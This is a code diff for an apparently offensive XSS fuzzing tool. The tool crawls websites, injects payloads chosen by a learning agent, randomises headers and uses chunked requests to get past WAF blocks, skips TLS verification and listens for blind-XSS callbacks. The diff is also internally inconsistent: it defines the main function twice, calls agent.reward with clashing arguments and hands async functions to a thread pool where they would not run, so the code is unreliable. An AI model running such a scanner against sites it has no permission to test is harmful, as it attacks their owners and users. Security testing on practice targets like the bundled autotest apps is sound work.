-    if key in global_visited_http: return
+
+async def fuzz_http(t: Dict[str, Any], use_chunked: bool = False) -> None:
+    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
+    if ext in static_exts:
+        return
+    
+    key = f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
+    if key in global_visited_http:
+        return
     global_visited_http.add(key)
-    target_param=random.choice(t["params"] or ["payload"])
-    payload=agent.choose(target_param)
-    sent_data={p:(payload if p==target_param else "") for p in t["params"]}
-    rate_limit(); session_splice()
+    
+    target_param = random.choice(t["params"] or ["payload"])
+    payload = agent.choose(target_param)
+    sent_data = {p: (payload if p == target_param else "") for p in t["params"]}
+    
+    rate_limit()
+    session_splice()
+    
     try:
         if t.get("json") and "template" in t:
-            body=json.loads(json.dumps(t["template"]))
-            set_deep(body,target_param,payload)
-            resp=SESSION.post(t["url"],json=body,headers=random_headers(),
-                              timeout=HTTP_TIMEOUT,verify=False)
+            body = json.loads(json.dumps(t["template"]))
+            set_deep(body, target_param, payload)
+            resp = SESSION.post(t["url"], json=body, headers=random_headers(),
+                              timeout=HTTP_TIMEOUT, verify=False)
         else:
-            if t["method"]=="GET":
-                resp=SESSION.get(t["url"],params=sent_data,headers=random_headers(),
-                                 timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
-                     chunked_fuzz_request(t["url"],"GET",random_headers(),urllib.parse.urlencode(sent_data))
+            if t["method"] == "GET":
+                resp = SESSION.get(t["url"], params=sent_data, headers=random_headers(),
+                                 timeout=HTTP_TIMEOUT, verify=False) if not use_chunked else \
+                     chunked_fuzz_request(t["url"], "GET", random_headers(), urllib.parse.urlencode(sent_data))
             else:
-                resp=SESSION.post(t["url"],data=sent_data,headers=random_headers(),
-                                  timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
-                     chunked_fuzz_request(t["url"],"POST",random_headers(),urllib.parse.urlencode(sent_data))
-        code,text=resp.status_code,resp.text.lower()
-        reward=R_OTHER
-        if code in (403,429,503) or any(x in text for x in ("captcha","denied","blocked")):
-            reward=R_BLOCK
-        elif code>=500: reward=R_SERROR
+                resp = SESSION.post(t["url"], data=sent_data, headers=random_headers(),
+                                  timeout=HTTP_TIMEOUT, verify=False) if not use_chunked else \
+                     chunked_fuzz_request(t["url"], "POST", random_headers(), urllib.parse.urlencode(sent_data))
+        
+        code, text = resp.status_code, resp.text.lower()
+        reward = R_OTHER
+        
+        if code in (403, 429, 503) or any(x in text for x in ("captcha", "denied", "blocked")):
+            reward = R_BLOCK
+        elif code >= 500:
+            reward = R_SERROR
         elif payload.lower() in text:
-            reward=R_REFLECT
-            if verify(t["url"],t["method"],sent_data,t.get("json",False)):
-                reward=R_CONFIRM
-                log_hit(t["url"],t["method"],payload,t["params"])
-        agent.reward(target_param,payload,reward)
+            reward = R_REFLECT
+            # Use await with the async verify function
+            if await verify(t["url"], t["method"], sent_data, t.get("json", False)):
+                reward = R_CONFIRM
+                log_hit(t["url"], t["method"], payload, t["params"])
+        
+        agent.reward(
+            param=target_param,
+            context="HTML_ATTR",  # or "JS_VAR", "HTML_TAG" based on reflection context
+            action=payload,
+            r=reward,
+            next_param=target_param  # or None if no follow-up param
+        )
     except Exception as e:
-        dbg(f"[fuzz_http] {e}"); agent.reward(target_param,payload,R_FAIL)
+        dbg(f"[fuzz_http] {e}")
+        agent.reward(target_param, payload, R_FAIL)
     jitter()
+
+
+async def main():
+    mode = "all"
+    if args.reflected:
+        mode = "reflected"
+    elif args.stored:
+        mode = "stored"
+    elif args.blind:
+        mode = "blind"
+    
+    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
+           (ap.print_help() or sys.exit(1))
+    
+    # Initialize reporting engine
+    reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
+                             "json" if args.json else "txt" if args.txt else "markdown")
+    
+    # Start Blind XSS Callback Server (if enabled)
+    if args.blind_xss:
+        callback_server = BlindXSSCallbackServer()
+        asyncio.create_task(callback_server.start())
+
+    waf, server = detect_context(roots[0])
+    logging.info(f"[CTX] WAF={waf} | Server={server}")
+    
+    global agent
+    agent = AdvancedRLAgent(waf, server, Path(args.qtable_file) if args.qtable_file else None,
+                          enabled=args.self_reinforcement)
+    
+    for root in roots:
+        logging.info(f"┌─▶ Crawling: {root}")
+        
+        # Discovery Phase
+        if args.crawl:
+            discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
+            discovery.crawl()
+            static_t = []
+            for form in discovery.discovered_forms:
+                static_t.append({
+                    "url": form["action"],
+                    "method": form["method"],
+                    "params": [i["name"] for i in form["inputs"]]
+                })
+            for url, params in discovery.discovered_params.items():
+                static_t.append({
+                    "url": url,
+                    "method": "GET",
+                    "params": list(params)
+                })
+        else:
+            static_t = []
+        
+        dynamic_t = await crawl_dynamic_async(root)  # Need async version
+        spa_t = await spa_dynamic_crawl_async(root) if args.simulate_spa else []
+        all_t = static_t + dynamic_t + spa_t
+        
+        # dedupe by (method,url,params)
+        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t for t in all_t}
+        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
+        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]
+        
+        if "graphql" in root.lower(): 
+            fuzz_graphql(root)
+            
+        if args.multi_session and (mode in ("stored", "all")):
+            multi_session_stored_check(http_t)
+            
+        # Create tasks for HTTP fuzzing
+        tasks = []
+        if mode in ("all", "reflected", "blind"):
+            for t in http_t:
+                tasks.append(fuzz_http(t))
+                tasks.append(fuzz_http(t, True))
+        
+        # Run all tasks concurrently
+        await asyncio.gather(*tasks)
+        
+        # DOM Analysis Phase
+        if args.deep_dom:
+            try:
+                async with async_playwright() as p:
+                    browser = await p.chromium.launch(headless=not args.headed)
+                    context = await browser.new_context(ignore_https_errors=True)
+                    page = await context.new_page()
+
+                    analyzer = DomXssAnalyzer(page)
+                    for url in discovery.crawled_urls:
+                        await page.goto(url, wait_until="networkidle")
+                        await analyzer.analyze()
+
+                    for vuln in analyzer.vulnerabilities:
+                        reporter.add_finding(
+                            url=page.url,
+                            param="DOM",
+                            payload=vuln['payload'],
+                            vuln_type="DOM XSS",
+                            evidence=f"Sink: {vuln['sink']}"
+                        )
+
+                    await browser.close()
+            except Exception as e:
+                logging.error(f"[DOM Analysis] Error: {e}")
+
+    # Check for any late blind XSS callbacks
+    if args.blind_xss:
+        await asyncio.sleep(60)  # Wait a bit for delayed callbacks
+        for unique_id, data in callback_server.found_callbacks.items():
+            reporter.add_finding(
+                url="Unknown (Blind)", 
+                param="Unknown", 
+                payload=unique_id,
+                vuln_type="Blind XSS", 
+                evidence=json.dumps(data, indent=2)
+            )
+    
+    reporter.write()
+    if SARIF_OUTPUT_FILE: 
+        write_sarif()
+    agent.save()
+    logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")
+
+
+# You'll also need these async versions of your crawler functions:
+async def crawl_dynamic_async(root: str) -> List[Dict[str, Any]]:
+    found = []
+    host = urllib.parse.urlparse(root).netloc.lower()
+    
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context(ignore_https_errors=True)
+        page = await context.new_page()
+        
+        async def on_request(request):
+            u = request.url
+            if urllib.parse.urlparse(u).netloc.lower() != host:
+                return
+                
+            m = request.method.upper()
+            is_json = "json" in (request.headers.get("content-type", "") or "").lower()
+            try:
+                post_data = json.loads(request.post_data or "{}")
+                params = list(post_data.keys())
+            except:
+                qs = urllib.parse.urlparse(u).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                
+            found.append({
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": post_data if is_json else {}
+            })
+        
+        page.on("request", on_request)
+        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+        await page.wait_for_timeout(2000)
+        await context.close()
+        await browser.close()
+    return found
+
+
+async def spa_dynamic_crawl_async(root: str, max_clicks: int = 20) -> List[Dict[str, Any]]:
+    found = []
+    host = urllib.parse.urlparse(root).netloc.lower()
+    
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context(ignore_https_errors=True)
+        page = await context.new_page()
+        
+        async def on_request(request):
+            u = request.url
+            if urllib.parse.urlparse(u).netloc.lower() != host:
+                return
+                
+            m = request.method.upper()
+            is_json = "json" in (request.headers.get("content-type", "") or "").lower()
+            try:
+                post_data = json.loads(request.post_data or "{}")
+                params = list(post_data.keys())
+            except:
+                qs = urllib.parse.urlparse(u).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                
+            found.append({
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": post_data if is_json else {}
+            })
+        
+        page.on("request", on_request)
+        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+        
+        for _ in range(max_clicks):
+            els = await page.query_selector_all("a[href],button,[role=button],.router-link")
+            for e in random.sample(els, len(els)):
+                try:
+                    await e.click(timeout=2000)
+                    await page.wait_for_timeout(1500)
+                    break
+                except:
+                    continue
+        
+        await context.close()
+        await browser.close()
+    return found
+
+
+def detect_reflection_context(html: str, payload: str) -> str:
+    if f"<{payload}" in html: return "HTML_TAG"
+    if f"'{payload}'" in html or f'"{payload}"' in html: return "HTML_ATTR"
+    if payload in re.findall(r"var\s+\w+\s*=\s*['\"][^'\"]*", html): return "JS_VAR"
+    return "NONE"
 
 def fuzz_ws(t:Dict[str,Any])->None:
     if not websocket or not t["url"].startswith(("ws://","wss://")): return
@@ -1440,42 +2115,60 @@ def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
 AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
           "https://juice-shop.herokuapp.com/"]
 
+
+
 async def main():
-    mode="all"
-    if args.reflected: mode="reflected"
-    elif args.stored:  mode="stored"
-    elif args.blind:   mode="blind"
-    roots=[smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
-          (ap.print_help() or sys.exit(1))
-    
-    # Initialize reporting engine
-    reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
-                              "json" if args.json else "txt" if args.txt else "markdown")
-    
-    # Start Blind XSS Callback Server (if enabled)
+    # Determine scan mode
+    mode = "all"
+    if args.reflected:
+        mode = "reflected"
+    elif args.stored:
+        mode = "stored"
+    elif args.blind:
+        mode = "blind"
+
+    # Prepare root URLs
+    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] \
+            if args.url or args.autotest else (ap.print_help() or sys.exit(1))
+
+    # Initialize reporting
+    reporter = ReportingEngine(
+        args.json or args.txt or "noctua_findings.md",
+        "json" if args.json else "txt" if args.txt else "markdown"
+    )
+
+    # Start Blind XSS callback server if needed
     if args.blind_xss:
         callback_server = BlindXSSCallbackServer()
         asyncio.create_task(callback_server.start())
 
-    waf,server=detect_context(roots[0])
+    # Detect WAF and server
+    waf, server = detect_context(roots[0])
     logging.info(f"[CTX] WAF={waf} | Server={server}")
-    global agent; agent=AdvancedRLAgent(waf,server,Path(args.qtable_file) if args.qtable_file else None,
-                                enabled=args.self_reinforcement)
-    
+
+    # Initialize RL agent
+    global agent
+    agent = AdvancedRLAgent(
+        waf,
+        server,
+        Path(args.qtable_file) if args.qtable_file else None,
+        enabled=args.self_reinforcement
+    )
+
+    # Loop through each root
     for root in roots:
         logging.info(f"┌─▶ Crawling: {root}")
-        
-        # Discovery Phase
+
+        # Discovery phase
         if args.crawl:
             discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
             discovery.crawl()
-            # Convert discovered forms/params to target format
             static_t = []
             for form in discovery.discovered_forms:
                 static_t.append({
                     "url": form["action"],
                     "method": form["method"],
-                    "params": [i["name"] for i in form["inputs"]]
+                    "params": [inp["name"] for inp in form["inputs"]]
                 })
             for url, params in discovery.discovered_params.items():
                 static_t.append({
@@ -1485,44 +2178,51 @@ async def main():
                 })
         else:
             static_t = []
-        
-        dynamic_t = crawl_dynamic(root)
-        spa_t = spa_dynamic_crawl(root) if args.simulate_spa else []
+
+        # Dynamic crawls (async)
+        dynamic_t = await crawl_dynamic_async(root)
+        spa_t = await spa_dynamic_crawl_async(root) if args.simulate_spa else []
         all_t = static_t + dynamic_t + spa_t
-        
-        # dedupe by (method,url,params)
-        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}":t for t in all_t}
-        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://","wss://"))]
-        ws_t   = [t for t in uniq.values() if t["url"].startswith(("ws://","wss://"))]
-        
-        if "graphql" in root.lower(): 
+
+        # Deduplicate targets
+        uniq = {
+            f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t
+            for t in all_t
+        }
+        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
+        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]
+
+        # GraphQL fuzzing if applicable
+        if "graphql" in root.lower():
             fuzz_graphql(root)
-            
-        if args.multi_session and (mode in ("stored","all")):
+
+        # Multi-session stored XSS
+        if args.multi_session and mode in ("stored", "all"):
             multi_session_stored_check(http_t)
-            
+
+        # Fuzz HTTP and WS concurrently
         exec_pool = ThreadPoolExecutor(max_workers=args.threads)
-        if mode in ("all","reflected","blind"):
-            for t in http_t: 
-                exec_pool.submit(fuzz_http,t)
-                exec_pool.submit(fuzz_http,t,True)
-            for w in ws_t:   
-                exec_pool.submit(fuzz_ws,w)
+        if mode in ("all", "reflected", "blind"):
+            for t in http_t:
+                exec_pool.submit(fuzz_http, t)
+                exec_pool.submit(fuzz_http, t, True)
+            for w in ws_t:
+                exec_pool.submit(fuzz_ws, w)
         exec_pool.shutdown(wait=True)
-        
-        # DOM Analysis Phase
-        if args.deep_dom and sync_playwright:
+
+        # DOM analysis
+        if args.deep_dom:
             try:
-                with sync_playwright() as p:
-                    browser = p.chromium.launch(headless=not args.headed)
-                    context = browser.new_context(ignore_https_errors=True)
-                    page = context.new_page()
-                    
+                async with async_playwright() as p:
+                    browser = await p.chromium.launch(headless=not args.headed)
+                    context = await browser.new_context(ignore_https_errors=True)
+                    page = await context.new_page()
+
                     analyzer = DomXssAnalyzer(page)
                     for url in discovery.crawled_urls:
-                        page.goto(url, wait_until="networkidle")
-                        analyzer.analyze()
-                    
+                        await page.goto(url, wait_until="networkidle")
+                        await analyzer.analyze()
+
                     for vuln in analyzer.vulnerabilities:
                         reporter.add_finding(
                             url=page.url,
@@ -1531,34 +2231,35 @@ async def main():
                             vuln_type="DOM XSS",
                             evidence=f"Sink: {vuln['sink']}"
                         )
-                    
-                    browser.close()
+
+                    await browser.close()
             except Exception as e:
                 logging.error(f"[DOM Analysis] Error: {e}")
 
-    # Check for any late blind XSS callbacks
+    # Late blind XSS callbacks
     if args.blind_xss:
-        await asyncio.sleep(60) # Wait a bit for delayed callbacks
-        for unique_id, data in callback_server.found_callbacks.items():
+        await asyncio.sleep(60)
+        for uid, data in callback_server.found_callbacks.items():
             reporter.add_finding(
-                url="Unknown (Blind)", 
-                param="Unknown", 
-                payload=unique_id,
-                vuln_type="Blind XSS", 
+                url="Unknown (Blind)",
+                param="Unknown",
+                payload=uid,
+                vuln_type="Blind XSS",
                 evidence=json.dumps(data, indent=2)
             )
-    
+
+    # Finalize report
     reporter.write()
-    if SARIF_OUTPUT_FILE: 
+    if SARIF_OUTPUT_FILE:
         write_sarif()
     agent.save()
-    logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")
+    logging.info(
+        f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}"
+    )
 
-if __name__=="__main__":
-    if sys.platform == "win32":
-        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-        
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        logging.info("Scan aborted by user.")
+if sys.platform == "win32":
+    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
+try:
+    asyncio.run(main())
+except KeyboardInterrupt:
+    logging.info("Scan aborted by user.")
